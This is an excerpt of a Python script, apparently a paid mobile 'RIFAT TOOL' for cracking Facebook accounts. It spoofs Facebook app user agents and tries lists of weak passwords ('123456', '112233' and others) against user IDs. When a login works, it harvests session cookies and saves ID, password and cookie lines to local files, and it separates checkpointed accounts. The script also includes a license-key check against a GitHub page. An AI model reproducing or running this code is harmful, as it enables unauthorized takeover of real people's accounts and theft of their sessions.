...
time.sleep(3)
os.system('clear')
print('\x1b[38;5;244m[\x1b[38;5;46m●\x1b[38;5;244m]\x1b[38;5;46m LODING ●\x1b[38;5;47m●\x1b[38;5;48m●\x1b[38;5;49m●\x1b[38;5;50m●\x1b[38;5;244m [\x1b[38;5;46mRIFAT TOOL\x1b[38;5;244m]\x1b[1;97m')
time.sleep(2)
try:
...
sys.stdout.write('\x1b]2; =(💚)-RIFAT-PAID-(💚)=\x07')
...
def RIFAT_M1():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/475.0.0.44.526;FBBV/2914194;FBDM/{density=1.64,width=320,height=1655};FBLC/en_US;FBRV/4068387;FBCR/T-Mobile;FBMF/LG;FBBD/LG;FBPN/com.facebook.mlite;FBDV/G8 ThinQ;FBSV/13.4;FBOP/2;FBCA/arm64-v8a]"+"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"
        return ua
#__________________[ M2 ]__________________#
def RIFAT_M2():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/475.0.0.44.526;FBBV/2914194;FBDM/{density=1.64,width=320,height=1655};FBLC/en_US;FBRV/4068387;FBCR/T-Mobile;FBMF/LG;FBBD/LG;FBPN/com.facebook.mlite;FBDV/G8 ThinQ;FBSV/13.4;FBOP/2;FBCA/arm64-v8a]"
        return ua
...
#-------------------// APPROVAL \\---------------------#
import os,httpx
sexkey = "R1F4T~("+str(os.getuid())+"=(CYBER)="+str(os.getuid())+")~KING"
def approval():
    sexkey = "R1F4T~("+str(os.getuid())+"=(CYBER)="+str(os.getuid())+")~KING"
    ress=httpx.get("https://github.com/ROLEX-SYBAR/Key-approved-/blob/main/Paid%20Usar").text
    if sexkey in ress:
        menu()
    else:
...
| $$  \ $$  | $$  | $$            | $$   | $$         
| $$  | $$ /$$$$$$| $$            | $$   | $$         
|__/  |__/|______/|__/            |__/   |__/  [0.7]
\x1b[1;97m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐\033[1;37m
\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m ANOTHER  \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mROLEX-SYBAR\x1b[38;5;244m] \x1b[1;97m          		      ┃
\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m FACEBOOK \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mAR1Y4N R1F4T\x1b[38;5;244m] \x1b[1;97m      	     ┃
...
def login(uid):
    ...
    try:
        ...
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890","332211","098765","009988","0987654","09876543","0987654321","112233","223344","102030","203040","1@2#3৳","019283"]:
            headers = {
            ...
            if "session_key" in rp:
                print(f"\r\x1b[38;5;244m(\x1b[38;5;244mSUCCESS\x1b[38;5;244m)\x1b[38;5;244m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}")
                open("/sdcard/RIFAT-OLD.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:              
                print(f"\r\x1b[38;5;244m(\x1b[38;5;46mSUCCESS\x1b[38;5;244m)\x1b[38;5;46m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}")
                open("/sdcard/RIFAT-OLD.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mSUCCESS\x1b[38;5;244m)\x1b[38;5;46m '+ids+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r\x1b[38;5;244m=(\x1b[38;5;46m💥\x1b[38;5;244m)={A} "+coki)
                                        linex()
                                        open('/sdcard/RIFAT-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;244m({Y}RIFAT-CP\x1b[38;5;244m){Y} '+ids+' | '+pas+'\033[1;97m')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        print(f"\r\r\x1b[38;5;244m=(\x1b[38;5;46m💥\x1b[38;5;244m)={A} "+coki)
                                        linex()
                                        open('/sdcard/RIFAT-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def rndm1(uid,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mSUCCESS\x1b[38;5;244m)\x1b[38;5;46m '+uid+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r\x1b[38;5;244m(\x1b[38;5;46mCOOKIE\x1b[38;5;244m)>{A} "+coki)
                                        open('/sdcard/RIFAT-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;244m({Y}RIFAT-CP\x1b[38;5;244m){Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RIFAT-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
